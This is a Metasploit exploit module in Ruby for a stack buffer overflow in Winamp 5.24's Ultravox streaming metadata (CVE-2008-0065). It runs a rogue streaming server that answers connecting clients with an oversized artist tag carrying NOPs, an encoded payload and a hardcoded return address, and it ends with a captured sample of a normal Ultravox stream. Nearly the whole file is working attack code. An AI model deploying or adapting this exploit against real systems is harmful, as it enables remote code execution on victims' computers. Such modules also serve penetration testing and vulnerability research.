##
# $Id: winamp_ultravox.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::TcpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Winamp Ultravox Streaming Metadata (in_mp3.dll) Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Winamp 5.24. By
				sending an overly long artist tag, a remote attacker may
				be able to execute arbitrary code. This vulnerability can be
				exploited from the browser or the winamp client itself.
			},
			'Author'         => 'MC',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2008-0065' ],
					[ 'OSVDB', '41707' ],
					[ 'BID', '27344' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 700,
					'BadChars' => "\x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40",
					'StackAdjustment' => -3500,
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Winamp 5.24', { 'Ret' => 0x15010d3e } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jan 18 2008',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "The HTTP daemon port to listen on.", 8080 ])
			], self.class)
	end

	def on_client_connect(client)
		return if ((p = regenerate_payload(client)) == nil)

		res = client.get_once

		content =  "\x00\x01\x00\x01\x00\x01" + "<metadata><song><artist>"
		content << make_nops(3828 - payload.encoded.length) + payload.encoded
		content << Rex::Arch::X86.jmp_short(6) + make_nops(2) + [target.ret].pack('V')
		content << [0xe8, -850].pack('CV') + rand_text_alpha_upper(1183)
		content << "</artist></song></metadata>"

		sploit =  "\x5a\x00\x39\x01" + [content.length].pack('n')
		sploit << content + "\x00"

		# randomize some stuff.
		num    = rand(65535).to_s

		header =  "HTTP/1.0 200 OK\r\n"
		header << "Server: Ultravox 3.0\r\n"
		header << "Content-Type: misc/ultravox\r\n"
		header << "Ultravox-SID: #{num}\r\n"
		header << "Ultravox-Avg-Bitrate: #{num}\r\n"
		header << "Ultravox-Max-Bitrate: #{num}\r\n"
		header << "Ultravox-Max-Msg: #{num}\r\n"
		header << "Ultravox-Stream-Info: Ultravox;Live Stream\r\n"
		header << "Ultravox-Msg-Que: #{num}\r\n"
		header << "Ultravox-Max-Fragments: 1\r\n\r\n"
		header << sploit

		print_status("Sending #{header.length} bytes to #{client.peerhost}:#{client.peerport}...")

		client.put(header)
		handler(client)

		service.close_client(client)
	end

end


=begin
HTTP/1.0 200
.Server: Ultravo
x 3.0..Content-T
ype: misc/ultrav
ox..Ultravox-SID
: 22221..Ultravo
x-Avg-Bitrate: 6
4000..Ultravox-M
ax-Bitrate: 9600
0..Ultravox-Max-
Msg: 16000..Ultr
avox-Stream-Info
: Ultravox;Live
Stream..Ultravox
-Msg-Que: 39..Ul
travox-Max-Fragm

Z.9..,......<met
adata><length>0<
/length><soon>Mo
re on
</soon><song><na
me>The Night
ghts In
tin</name><album
>Days Of
Passed</album><a
rtist>The Moody
Blues</artist><a
lbum_art>xm/stat
ion_logo_WBCRHT.
jpg</album_art><
album_art_200>xm
/station_logo_WB
CRHT_200.jpg</al
bum_art_200><ser
ial>-1</serial><
song_id>-1</song
_id><amg_song_id
>-1</amg_song_id
><amg_artist_id>
-1</amg_artist_i
d><amg_album_id>
-1</amg_album_id
><itunes_song_id
>-1</itunes_song
_id><itunes_arti
st_id>-1</itunes
_artist_id><itun
es_album_id>-1</
itunes_album_id>
</song></metadat
a>.Z.......\./!.
!.UP.......B...&
Z....D)ydB.,.vy/
=end
